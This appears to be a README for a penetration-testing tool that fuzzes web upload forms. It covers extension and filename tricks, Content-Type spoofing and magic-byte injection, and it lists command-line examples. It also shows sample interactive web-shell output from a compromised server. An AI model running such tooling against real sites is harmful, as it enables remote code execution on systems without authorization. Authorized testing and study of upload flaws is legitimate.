👻 File_Uploader – File Upload Exploitation Tool

📝 Description

File_Uploader is a powerful file upload exploitation and fuzzing tool designed for penetration testers, bug bounty hunters, and security researchers.
It automates testing of file upload vulnerabilities, including:
File extension fuzzing (php, asp, jsp, config, etc.)
Special character injection in filenames (null bytes, slashes, etc.)
Content-Type header fuzzing to bypass MIME filters
Magic bytes injection to trick server-side file type validation
Automatic web shell detection & interactive command execution
This tool is built to identify misconfigurations, whitelist bypasses, and RCE opportunities from vulnerable upload forms.

🚀 Features

✅ Extension fuzzing with built-in categories or custom wordlists

✅ Double & reverse extension attacks

✅ Special characters injection (%00, %0a, : etc.)

✅ Content-Type header fuzzing (use custom list or defaults)

✅ Magic bytes injection (prepend real image headers)

✅ Auto-detect uploaded shells and spawn interactive shell

✅ Beautiful color-coded results table with rich

📦 Installation
git clone https://github.com/YOURUSERNAME/file_uploader.git
cd file_uploader
pip install -r requirements.txt


Requirements:
Python 3.x
requests
rich
Install dependencies:
pip install requests rich

🛠️ Usage
python3 file_uploader.py --upload-url http://target/upload.php --base-url http://target

Examples:
# 1. Fuzz using built-in PHP extension list
python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --category php

# 2. Use custom wordlist of extensions
python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --wordlist /path/to/wordlist.txt

# 3. Fuzz Content-Type headers automatically
python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --fuzz-content-type

# 4. Use Magic Bytes injection (prepend real image headers)
python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --magic-bytes

# 5. Combine all (extension + content-type + magic bytes)
python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --category php --fuzz-content-type --magic-bytes

⚙️ Options
Flag	Description
--upload-url	Target file upload handler (e.g. http://host/upload.php)
--base-url	Base URL to access uploaded files (e.g. http://host)
--category	Extension category to test (php, asp, jsp, cfm, node, config, other, all)
--wordlist	Path to custom wordlist of extensions (overrides --category)
--fuzz-content-type	Enable fuzzing with multiple Content-Type headers (default uses image/* types)
--content-type-list	Path to custom list of content types
--magic-bytes	Enable Magic Bytes injection (prepend real image headers: PNG, GIF, JPEG)

🎨 Output

Green: Successful upload + working RCE (web shell detected)
Yellow: Upload succeeded but no RCE detected
Red: Upload failed

When a shell is found, the tool offers an interactive shell:
[*] Web shell available at: http://target/profile_images/shell.php
shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
shell> uname -a
Linux target 5.4.0-81-generic ...

🧠 How It Works

Generates filename variants (double/reverse extension + special chars)
Uploads each payload with various Content-Types
(Optional) Prepend Magic Bytes to fool content validation
Checks if upload succeeded
Tests RCE by executing id
Displays results in a colorful table

⚠️ Disclaimer

This tool is for educational and authorized penetration testing purposes only.
Do not use it on systems you do not own or have explicit permission to test.

🏴‍☠️ Author
   Gh0stSh3ll5619
👻 Ghostops-Security
